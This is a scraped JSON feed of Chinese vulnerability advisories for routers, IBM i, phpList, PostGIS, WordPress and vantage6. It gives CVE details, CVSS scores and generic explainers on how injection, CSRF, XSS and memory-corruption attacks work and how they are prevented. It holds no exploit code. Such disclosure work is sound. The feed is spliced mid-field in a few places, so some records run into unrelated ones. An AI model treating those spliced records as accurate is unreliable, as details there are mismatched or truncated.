"不检查输入大小的缓冲区复制（“经典缓冲区溢出”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-a38q-i2n6", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-a38q-i2n6", "name": "https://www.oscs1024.com/hd/MPS-a38q-i2n6"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19821", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-19821"}, {"url": "https://github.com/lipenghai/iot_bug/blob/main/Tenda/AC12/4.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19821", "name": ""}, {"url": "https://vuldb.com/submit/868922", "name": ""}, {"url": "https://vuldb.com/vuln/389954", "name": ""}, {"url": "https://vuldb.com/vuln/389954/cti", "name": ""}, {"url": "https://www.tenda.com.cn/", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-19821漏洞", "_translated": true, "_saved_at": "2026-08-14T11:39:47+00:00", "_first_saved_at": "2026-08-14T11:39:47+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-a38q-i2n6"}, {"analysis_status": 0, "articles": [{"content": "应用程序在进行身份验证时使用了不恰当的机制或实施不安全的验证方法。这可能包括使用未限制登录次数、使用不安全的会话管理、缺乏多因素身份验证等。攻击者可以利用这些弱点来绕过身份验证，冒充合法用户，获取未授权的访问权限。", "title": "什么是身份验证不当"}, {"content": "- 密码破解：攻击者尝试使用暴力破解或字典攻击等方法，通过尝试各种密码组合来猜测合法用户的密码。如果应用程序没有限制登录次数并使用弱密码或密码哈希算法，攻击者可以成功地破解密码并获取访问权限。\r\n- 会话劫持：攻击者通过获取合法用户的会话标识符（如Cookie）来劫持其会话。这可以通过窃取会话标识符、使用会话固定攻击或通过 XSS 等方式实现。一旦攻击者获得有效的会话，他们可以冒充合法用户执行未经授权的操作。\r\n- CSRF攻击：攻击者通过欺骗受害者利用其身份在已登录的应用程序中执行恶意操作。这种攻击利用了应用程序在处理来自受信任网站的请求时未进行适当验证的漏洞。", "title": "身份验证不当常见的攻击方式"}, {"content": "- 使用强密码策略：应用程序应该要求用户使用强密码，并通过密码复杂性要求、密码长度限制等措施来确保密码的强度。\r\n- 密码哈希和盐值：应用程序应该使用适当的密码哈希算法，并为每个用户生成唯一的盐值。这样可以防止攻击者通过哈希碰撞或彩虹表攻击破解密码。\r\n- 多因素身份验证：应用程序可以引入多因素身份验证，结合密码与其他因素（如指纹、短信验证码、硬件令牌等）来提高安全性。\r\n- 安全的会话管理：使用安全的会话管理机制，如随机生成会话标识符、在会话过期时强制重新验证等，以防止会话劫持攻击。\r\n- 输入验证与过滤：在进行身份验证之前，应该对用户输入进行适当的验证和过滤，以防止 XSS 和其他攻击。\r\n- 定期安全审计：进行定期的安全审计和漏洞扫描，及时修复发现的安全问题。", "title": "如何预防身份验证不当"}], "cnvd_id": "", "cve_id": "CVE-2026-73655", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", "severity": "high", "base_score": 7.4}]}, "cvss_score": 7.4, "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", "cwe": "CWE-287", "descripti : "MPS-zbhr-8q9u", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-zbhr-8q9u", "name": "https://www.oscs1024.com/hd/MPS-zbhr-8q9u"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19815", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-19815"}, {"url": "https://github.com/panda666-888/vuls/blob/main/totolink/a800r/setParentalRules.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19815", "name": ""}, {"url": "https://vuldb.com/submit/869442", "name": ""}, {"url": "https://vuldb.com/vuln/389951", "name": ""}, {"url": "https://vuldb.com/vuln/389951/cti", "name": ""}, {"url": "https://www.totolink.net/", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-19815漏洞", "_translated": true, "_saved_at": "2026-08-14T11:39:48+00:00", "_first_saved_at": "2026-08-14T09:54:28+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-zbhr-8q9u"}, {"analysis_status": 0, "articles": [{"content": "在程序没有正确验证和限制内存写操作的情况下，攻击者通过向应用程序提供恶意输入，成功地将数据写入超出其预期范围的内存位置。这可能导致程序的内存损坏，使攻击者能够执行任意代码或破坏应用程序的正常运行。", "title": "什么是越界写入"}, {"content": "- 缓冲区溢出：攻击者向应用程序的输入缓冲区中输入超出其容量的数据，导致数据溢出到相邻的内存区域，从而修改重要的数据结构或执行恶意代码。\n- 栈溢出：攻击者通过向函数调用栈中注入超出其容量的数据，覆盖返回地址或重要的控制信息，控制程序的执行流程。\n- 格式化字符串漏洞：攻击者利用格式化字符串函数的漏洞，通过提供恶意格式字符串来修改内存内容，进而执行任意代码。", "title": "越界写入常见的攻击方式"}, {"content": "- 输入验证和过滤：对于所有用户输入的数据，进行严格的验证和过滤，确保只接受合法的输入数据。\n- 使用安全的内存操作函数：使用安全的内存操作函数，如安全的字符串拷贝函数（如strcpy_s、strncpy_s）和安全的格式化函数（如snprintf、sprintf_s），确保内存操作的安全性。\n- 边界检查：在进行内存写操作时，确保操作不会超出内存的边界，可以使用边界检查函数或标准库提供的安全函数来实现。\n- 内存保护机制：启用操作系统或编译器提供的内存保护机制，如地址空间布局随机化（ASLR）、数据执行保护（DEP）等，以增加攻击的难度。\n- 定期更新和修复：及时应用厂商发布的安全补丁和更新，修复已知的跨界内存写漏洞。", "title": "如何预防越界写入"}], "cnvd_id": "", "cve_id": "CVE-2026-18511", "cvss": {"cvssv31": [{"source": "psirt@us.ibm.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", "severity": "high", "base_score": 7.3}]}, "cvss_score": 7.3, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", "cwe": "CWE-787", "description": "IBM i 7.6、7.5、7.4 和 7.3 可能允许本地经过身份验证的攻击者在本机 IBM i JSSE 提供程序中生成基于堆栈的缓冲区溢出，这是由 TLS 会话建立期间不正确的边界检查引起的。本地攻击者可能会溢出固定长度缓冲区并在系统上执行任意代码或导致 JVM 进程崩溃。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "越界写入", "kind_en": "越界写入", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-398f-1xtn", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-398f-1xtn", "name": "https://www.oscs1024.com/hd/MPS-398f-1xtn"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-18511", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-18511"}, {"url": "https://www.ibm.com/support/pages/node/7283285", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-18511漏洞", "_translated": true, "_saved_at": "2026-08-13T22:34:56+00:00", "_first_saved_at": "2026-08-13T22:34:56+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-398f-1xtn"}, {"analysis_status": 0, "articles": [{"content": "应用程序未能正确验证和过滤用户输入，将用户提供的数据直接用作操作系统命令的一部分。攻击者可以利用这个漏洞，通过注入恶意的操作系统命令来执行任意系统命令、获取敏感信息或者对系统进行未授权的操作。", "title": "什么是OS命令注入"}, {"content": "- 命令拼接：应用程序将用户输入直接拼接到操作系统命令中，而不进行合适的过滤和验证。攻击者可以通过在输入中注入特殊字符、命令分隔符等，来执行额外的命令或修改原始命令的行为。\r\n- 命令注释：攻击者通过在输入中注入特殊字符或命令注释符号，如\"#\"或\"//\"，来注释掉原始命令中的一部分，然后执行自己的恶意命令。\r\n- 命令管道：攻击者通过在输入中注入管道符号\"|\"，将多个命令连接起来执行。这使得攻击者可以在单个注入点上执行多个命令，进一步扩大攻击的范围。", "title": "OS命令注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对用户输入进行严格的验证和过滤，确保只接受预期的有效输入。可以使用白名单验证，限制用户输入的字符集和格式，防止特殊字符和命令注释符的注入。\r\n- 使用参数化命令或预编译语句：应该使用参数化命令或预编译语句，而不是将用户输入直接拼接到命令中。这样可以将输入数据视为参数，而不是命令的一部分，从而避免命令注入漏洞。\r\n- 最小特权原则：应用程序在执行操作系统命令时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。这样即使发生命令注入漏洞，攻击者的权限也会受到限制。\r\n- 安全编码实践：开发人员应避免使用不受信任的用户输入来拼接命令，并使用安全的编码实践，如输入验证、输出编码和参数化查询等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止命令注入攻击。", "title": "如何预防OS命令注入"}], "cnvd_id": "", "cve_id": "CVE-2026-19771", "cvss": {"cvssv2": [{"source": "cna@vuldb.com", "vector": "AV:N/AC:L/Au:M/C:C/I:C/A:C", "severity": "high", "base_score": 8.3}], "cvssv31": [{"source": "cna@vuldb.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.2}], "cvssv4": [{"source": "cna@vuldb.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.3}]}, "cvss_score": 7.3, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-78", "description": "Baicells EG3661M BaiCE_BQ6_2.0.5.3_NA 中发现了一个漏洞。这会影响 LuCI Web 界面组件的文件 /cgi-bin/luci 的未知功能。对 MaxHops/Timeout/Size 参数的这种操作会导致操作系统命令注入。攻击可能是远程发起的。该漏洞是公开可用的并且可能会被使用。我们很早就就此事联系了供应商，但没有以任何方式做出回应。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "OS命令注入", "kind_en": "操作系统命令中使用的特殊元素的不正确中和（“操作系统命令注入”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-5m7c-bphe", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-5m7c-bphe", "name": "https://www.oscs1024.com/hd/MPS-5m7c-bphe"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19771", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-19771"}, {"url": "https://github.com/actuator/cve/blob/main/Baicells/EG3661M.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19771", "name": ""}, {"url": "https://vuldb.com/submit/869362", "name": ""}, {"url": "https://vuldb.com/vuln/389685", "name": ""}, {"url": "https://vuldb.com/vuln/389685/cti", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-19771漏洞", "_translated": true, "_saved_at": "2026-08-14T04:01:42+00:00", "_first_saved_at": "2026-08-14T04:01:42+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-5m7c-bphe"}, {"analysis_status": 0, "articles": [{"content": "跨站点请求伪造 (CSRF)通过利用网站对用户请求的信任进行攻击。当用户在网站A登录并在同一浏览器会话中访问网站B时，攻击者可以构造特制的请求并诱使用户执行，以使网站B误以为这些请求是用户合法发起的。\n攻击者通常通过欺骗用户点击恶意链接、在受信任的网站中植入恶意代码或通过钓鱼等手段来实施CSRF攻击，一旦用户执行了恶意请求，攻击者可以以用户的身份执行任意操作，包括更改用户密码、发起资金转账或删除重要数据等。", "title": "什么是CSRF"}, {"content": "- 链接欺骗：攻击者通过向用户发送包含恶意链接的电子邮件或社交媒体消息，诱使用户点击并执行恶意请求。\n- 图片引用攻击：攻击者通过在恶意网站上包含指向目标网站的图片引用，以触发用户浏览器自动发送目标网站的请求。\n- XSS利用：如果目标网站存在XSS漏洞，攻击者可以注入恶意脚本，以使用户在浏览器中执行恶意请求。", "title": "CSRF常见的攻击方式"}, {"content": "- 随机令牌：网站可以在每个请求中包含一个随机生成的令牌（CSRF Token），并验证该令牌的有效性，以确认请求的来源是合法的。\n- SameSite Cookie：使用SameSite属性来限制跨站点请求，将Cookie的发送限制在同一站点上，减少了跨站请求伪造的风险。\n- 双重验证：对于敏感操作，网站可以要求用户进行额外的验证，例如输入验证码、提供第二个因素的身份验证等。\n- 强化浏览器策略：网站可以设置Content-Security-Policy（CSP）头，限制浏览器执行恶意脚本的能力，减少CSRF攻击的风险。\n- 限制用户操作：网站可以要求用户在执行敏感操作之前进行明确的确认或授权，防止恶意请求被误触发。\n- 安全编码实践：开发人员应遵循安全编码实践，对用户输入进行适当的验证和过滤，防止恶意请求的注入。", "title": "如何预防CSRF"}], "cnvd_id": "", "cve_id": "CVE-2026-73482", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H", "severity": "high", "base_score": 8.1}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.2}]}, "cvss_score": 7.2, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-352", "description": "3.7.0-RC5之前的phpList在lists/admin/admins.php中包含跨站点请求伪造（CSRF）漏洞。管理员删除操作是通过未经身份验证的 GET 请求 (?page=admins\u0026delete=N) 触发的，该请求不受 CSRF 令牌保护（中央 verifyCsrfGetToken 检查使用 enforce=false，并且当令牌参数不存在时会被绕过）。远程攻击者可以诱骗登录的超级管理员加载精心设计的 URL（例如，作为图像嵌入电子邮件中）以删除任何非自身管理员帐户。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "CSRF", "kind_en": "跨站请求伪造 (CSRF)", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-7xcj-fqh6", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-7xcj-fqh6", "name": "https://www.oscs1024.com/hd/MPS-7xcj-fqh6"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73482", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73482"}, {"url": "https://github.com/phpList/phplist3/commit/5159c3ed33a5674a8169472b50d146d97f630746", "name": ""}, {"url": "https://github.com/phpList/phplist3/issues/1117", "name": ""}, {"url": "https://github.com/phpList/phplist3/pull/1121", "name": ""}, {"url": "https://github.com/phpList/phplist3/releases/tag/v3.7.0-RC5", "name": ""}, {"url": "https://www.vulncheck.com/advisories/phplist-rc5-cross-site-request-forgery-via-admins-php", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73482漏洞", "_translated": true, "_saved_at": "2026-08-13T20:36:02+00:00", "_first_saved_at": "2026-08-13T20:36:02+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-7xcj-fqh6"}, {"analysis_status": 0, "articles": [{"content": "跨界内存读是指应用程序在读取内存时，未正确验证或限制读取的内存范围。攻击者利用这种漏洞可以读取应用程序内存中的敏感数据，如密码、加密密钥、会话令牌等。常见的原因是由于缓冲区溢出、格式化字符串漏洞或其他内存错误导致的。", "title": "什么是越界读取"}, {"content": "攻击者可以通过不当构造的输入来触发跨界内存读漏洞。攻击者可能会通过向应用程序发送特定的输入，使其读取超过预期的内存区域。攻击者可以利用这个漏洞来获取敏感信息，如其他用户的数据、操作系统的敏感数据或应用程序的内部状态。", "title": "越界读取常见的攻击方式"}, {"content": "- 输入验证和限制：应用程序应对所有输入数据进行严格的验证和限制。确保输入数据的长度、格式和内容符合预期，避免超出缓冲区或访问非预期的内存区域。\n- 内存安全编程实践：开发人员应使用安全的编程实践，如避免使用不安全的函数、正确处理内存分配和释放操作，以及遵循最小特权原则。\n- 使用安全的编程语言和库：选择使用安全性较高的编程语言和库，这些语言和库在内存管理和安全性方面提供了更多的保护机制。\n- 定期进行代码审查和安全测试：定期审查应用程序的代码，并进行安全测试，以发现潜在的跨界内存读漏洞。使用静态代码分析工具和漏洞扫描工具来辅助检测和修复问题。\n- 实施防御性编程技术：应用程序应采用防御性编程技术，如使用随机化地址空间布局（ASLR）、堆栈保护机制（如堆栈溢出保护）和数据执行预防（DEP）等。\n- 及时更新和修补：及时应用程序和操作系统的安全更新和补丁，以确保已知的跨界内存读漏洞得到修复。及时更新相关软件和库，以避免使用已知存在漏洞的版本。", "title": "如何预防越界读取"}], "cnvd_id": "", "cve_id": "CVE-2026-73515", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H", "severity": "high", "base_score": 8.1}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.2}]}, "cvss_score": 7.2, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-125", "description": "3.7.0beta2之前的PostGIS包含越界读取漏洞，允许攻击者通过提供格式错误的FlatGeobuf缓冲区来导致内存泄露或服务器崩溃。 FlatGeobuf 属性元数据解码器验证字符串长度字段是否存在，但在将其具体化为 SQL 可见值之前无法验证后续字符串正文是否包含在提供的缓冲区中，从而导致内存泄漏或拒绝服务。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "越界读取", "kind_en": "越界读取", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-c0sa-m2yv", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-c0sa-m2yv", "name": "https://www.oscs1024.com/hd/MPS-c0sa-m2yv"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73515", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73515"}, {"url": "https://gitea.osgeo.org/postgis/postgis/raw/tag/3.7.0beta2/NEWS", "name": ""}, {"url": "https://mehmetince.net/part-1-6-systemic-risks-in-the-managed-postgresql-industry-extension-risks-are-real-exploiting-postgis-memory-corruption-bug-at-neondb-supabase-and-many-more/", "name": ""}, {"url": "https://www.vulncheck.com/advisories/postgis-0beta2-out-of-bounds-read-via-flatgeobuf-buffer", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73515漏洞", "_translated": true, "_saved_at": "2026-08-13T16:51:02+00:00", "_first_saved_at": "2026-08-13T16:51:02+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-c0sa-m2yv"}, {"analysis_status": 0, "articles": [{"content": "- 当攻击者欺骗合法的基于 Web 的应用程序或站点接受来自可信来源的请求时，就会发生跨站点脚本攻击。\r\n- 这是通过转义 Web 应用程序的上下文来完成的； 然后，Web 应用程序将该数据与其他受信任的动态内容一起交付给其用户，而无需对其进行验证。 浏览器不知不觉地在客户端执行恶意脚本（通过客户端语言；通常是 JavaScript 或 HTML）以执行通常被浏览器的同源策略阻止的操作。\r\n- ֿ注入恶意代码是最普遍的XSS利用方式； 因此，转义字符以防止这种操作是保护代码免受此漏洞影响的首要方法。\r\n- 转义意味着应用程序被编码以标记关键字符，特别是用户输入中包含的关键字符，以防止这些字符在危险的上下文中被解释。 例如，在 HTML 中，\u003c 可以编码为 \u0026lt; 并且\u003e可以被编码为\u0026gt; 为了在文本中被解释和显示为它们自己，而在代码本身中，它们被用于 HTML 标记。 如果将恶意内容注入到转义特殊字符的应用程序中，并且该恶意内容使用 \u003c 和 \u003e 作为 HTML 标记，那么如果这些字符在应用程序代码中正确转义，那么这些字符将不会被浏览器解释为 HTML 标记。 转移未遂攻击的方式。\r\n- XSS 最突出的用途是窃取 cookie（来源：OWASP HttpOnly）和劫持用户会话，但 XSS 漏洞已被用于暴露敏感信息、允许访问特权服务和功能以及传播恶意软件。", "title": "什么是XSS"}, {"content": "| 类型        | 描述                                                         |\r\n| ----------- | ------------------------------------------------------------ |\r\n| 存储型      | 攻击者将恶意代码插入到应用程序中（通常作为链接）。 每次用户单击链接时，代码都会被激活。 |\r\n| 反射型      | 攻击者从易受攻击的网站应用程序外部向用户提供恶意链接。 单击时，恶意代码将发送到易受攻击的网站，将攻击反映回用户的浏览器。 |\r\n| 基于 DOM 的 | 攻击者强制用户的浏览器呈现恶意页面。 页面中的数据本身提供跨站点脚本数据。 |\r\n| 变异        | 攻击者注入看似安全的代码，但随后在解析标记时被浏览器重写和修改。 一个例子是重新平衡未闭合的引号，甚至为未引用的参数添加引号。 |", "title": "XSS常见的攻击方式"}, {"content": "- 在将 HTTP 请求中的数据输入反射回来之前对其进行清理，确保在将任何数据回显给用户之前验证、过滤或转义所有数据，例如搜索期间的查询参数值。\r\n- 将特殊字符（如 ?、\u0026、/、\u003c、\u003e 和空格）转换为其各自的 HTML 或 URL 编码等价物。\r\n- 为用户提供禁用客户端脚本的选项。\r\n- 重定向无效请求。\r\n- 检测同时登录，包括来自两个不同 IP 地址的登录，并使这些会话无效。\r\n- 使用并执行内容安全策略（Content Safe Policy）来禁用可能被 XSS 攻击操纵的任何功能。\r\n- 阅读代码中引用的所有库的文档，了解哪些元素允许嵌入 HTML。", "title": "如何预防XSS"}], "cnvd_id": "", "cve_id": "CVE-2026-18109", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N", "severity": "high", "base_score": 7.2}]}, "cvss_score": 7.2, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N", "cwe": "CWE-79", "description": "由于输入清理和输出转义不足，WordPr edhat.com/show_bug.cgi?id=2514217", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73266漏洞", "_translated": true, "_saved_at": "2026-08-13T18:55:16+00:00", "_first_saved_at": "2026-08-13T18:55:16+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-pdz6-2i09"}, {"analysis_status": 0, "articles": [{"content": "- 程序中的访问控制机制未正确实现，这种缺陷通常会导致未授权的用户或资源可以访问程序中的重要数据或资源，从而导致程序崩溃或出现其他错误。", "title": "什么是授权检查错误"}, {"content": "- 特权提升攻击：攻击者可以通过利用此缺陷，绕过应用程序的访问控制机制，获取系统管理员权限，从而完全控制系统。\n- 数据泄露攻击：攻击者可以通过利用此缺陷，获取系统中敏感数据，如用户凭证、信用卡信息等。\n- 拒绝服务攻击：攻击者可以通过利用此缺陷，对系统进行拒绝服务攻击，从而使系统无法正常工作。\n- 恶意软件传播：攻击者可以通过利用此缺陷，将恶意软件传播到系统中，从而控制系统或窃取敏感数据。\n", "title": "授权检查错误常见的攻击方式"}, {"content": "- 使用访问控制列表 (ACL):使用 ACL 可以限制用户对程序中的不同资源的访问权限。ACL 通常由用户名、权限和资源地址组成，可以确保只有授权用户才能访问程序中的重要数据或资源。\n- 使用访问令牌：使用访问令牌可以确保只有授权用户才能访问程序中的不同资源。令牌通常由用户 ID、权限和资源地址组成，可以确保只有授权用户才能更改令牌的权限。\n- 使用安全审计：在程序中记录安全审计日志，可以确保管理员可以追踪未授权用户的活动。同时，定期审查安全审计日志，可以及时发现未授权的活动并采取相应的措施。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查错误"}], "attack_vector_type": "Network", "cnvd_id": "", "cve_id": "CVE-2026-73652", "cvss": {"cvssv4": [{"source": "security-advisories@github.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.1}]}, "cvss_score": 7.1, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-863", "description": "### 影响\n编辑权限缺乏所有权检查，因此其他开发人员可以更改稍后受节点信任的元数据。 \n\n他们能做的最糟糕的事情就是更新图像或图像标签。如果未注明，则会批准另一张图像，而不是实际正在审核的图像\n\n### 补丁\n否\n\n### 解决方法\n否", "effects": [{"comp_name": "vantage6", "ecosystem": "pip", "versions": [{"affected_version": "(-∞,5.0.2]", "min_fixed_version": "", "repository": "pip", "solutions": [], "upstream": true}]}, {"comp_name": "vantage6-algorithm-store", "ecosystem": "pip", "versions": [{"affected_version": "(-∞,5.0.2]", "min_fixed_version": "", "repository": "pip", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查错误", "kind_en": "授权错误", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-vja6-14ce", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://github.com/vantage6/vantage6/security/advisories/GHSA-47w6-gwp4-w6vc", "name": ""}, {"url": "https://github.com/advisories/GHSA-47w6-gwp4-w6vc", "name": ""}], "scope_influence": "", "tags": ["python", "开源"], "title": "vantage6：算法开发人员可以编辑其他开发人员正在等待/正在审核的算法", "_translated": true, "_saved_at": "2026-08-13T20:36:00+00:00", "_first_saved_at": "2026-08-13T20:36:00+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-vja6-14ce"}, {"analysis_status": 0, "articles": [{"content": "应用程序在权限管理方面存在缺陷，未能正确地验证和限制用户的权限。这可能包括访问控制列表（ACL）的不当配置、权限检查的缺失或错误、不恰当的身份验证和授权过程等。攻击者可以利用这些缺陷来绕过访问控制，获得未经授权的权限，执行敏感操作或访问敏感信息。", "title": "什么是权限管理不当"}, {"content": "- 水平权限提升：攻击者以与当前授权相同的权限冒充其他用户，获取对其他用户的访问权限。这可能是由于应用程序未能适当验证和限制用户的身份验证和授权。\r\n- 垂直权限提升：攻击者以比其当前授权更高的权限执行操作，获取对更高权限资源的访问。这可以发生在应用程序未正确验证用户请求的权限级别，或者在权限检查过程中存在漏洞的情况下。\r\n- 特权维持：攻击者通过利用特权管理的不当实施，将其特权保持在系统中。这可以包括未及时撤销特权、未正确管理特权的生命周期等。", "title": "权限管理不当常见的攻击方式"}, {"content": "- 适当的访问控制：应用程序应该实施适当的访问控制机制，包括强制访问控制列表（ACL）、角色基础访问控制（RBAC）、最小权限原则等，以确保用户只能访问其授权范围内的资源。\r\n- 身份验证和授权的正确实施：应用程序应该正确实施身份验证和授权机制，包括验证用户的身份、验证请求的权限级别，以及在授权过程中进行必要的权限检查。\r\n- 权限分离原则：应用程序应该根据职责和功能将特权分离，并只授予用户所需的最低权限，遵循最小特权原则。\r\n- 审计和监控：应用程序应该记录和监控特权操作，及时检测和响应异常或未经授权的特权访问。\r\n- 安全编码实践：开发人员应遵循安全编码实践，如输入验证、输出编码、错误处理等，以防止特权管理不当的漏洞。", "title": "如何预防权限管理不当"}], "cnvd_id": "", "cve_id": "CVE-2026-15001", "cvss": {"cvssv31": [{"source": 